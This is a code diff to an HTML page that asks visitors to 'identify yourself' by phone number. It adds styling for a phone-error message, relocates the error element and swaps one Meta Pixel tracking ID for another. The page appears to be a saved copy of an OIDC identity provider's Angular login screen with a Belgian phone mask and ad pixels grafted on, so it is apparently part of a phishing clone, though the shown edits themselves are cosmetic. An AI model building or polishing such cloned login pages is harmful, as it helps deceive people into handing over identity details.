@@ -16,7 +16,29 @@
   <link rel="stylesheet" href="/assets//styles.64ac09ea73ffc406.css" media="all">
   <link rel="stylesheet" href="/assets/css3.css">
   <link rel="stylesheet" href="/assets/css2.css">
-
+  <style>
+    #phone-error {
+      color: #721c24;
+      background-color: #f8d7da;
+      border: 1px solid #f5c6cb;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      display: none;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    #phone-error.show {
+      display: flex;
+      align-items: center;
+    }
+    #phone-error::before {
+      content: '⚠️';
+      margin-right: 10px;
+      font-size: 18px;
+    }
+  </style>
+</head>
 <body>
   <oidc-root ngcspnonce="1024df17-0385-46c0-abab-f0c60f35c714"
     ng-version="19.2.6"><oidc-entry-shell><oidc-app-qr-phone-form-shell><fui-template _nghost-ng-c385892400="">
@@ -63,6 +85,7 @@
                 <div _ngcontent-ng-c385892400="" class="im-content-primary"><oidc-app-qr-phone-form contentprimary=""
                     _nghost-ng-c2021898164="">
                     <h1 _ngcontent-ng-c2021898164="">{{ __('messages.identify_yourself') }}</h1>
+                    <div id="phone-error-container"></div>
                     <div _ngcontent-ng-c2021898164="" class="normal">
                       <div _ngcontent-ng-c2021898164="" class="im-form ng-pristine ng-valid ng-touched">
                         <fui-accordion _ngcontent-ng-c2021898164="" _nghost-ng-c471075519="">
@@ -328,7 +351,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const errorDiv = document.createElement('div');
     errorDiv.className = 'phone-error';
     errorDiv.id = 'phone-error';
-    phoneInput.parentNode.appendChild(errorDiv);
+    document.getElementById('phone-error-container').appendChild(errorDiv);
     
     // Маска для бельгийского телефона: +32 XXX XXX XXX
     const phoneMask = IMask(phoneInput, {
@@ -545,11 +568,11 @@ n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1344155130640766');
+fbq('init', '1398096467952166');
 fbq('track', 'PageView');
 </script>
 <noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1344155130640766&ev=PageView&noscript=1"
+src="https://www.facebook.com/tr?id=1398096467952166&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
 </body>
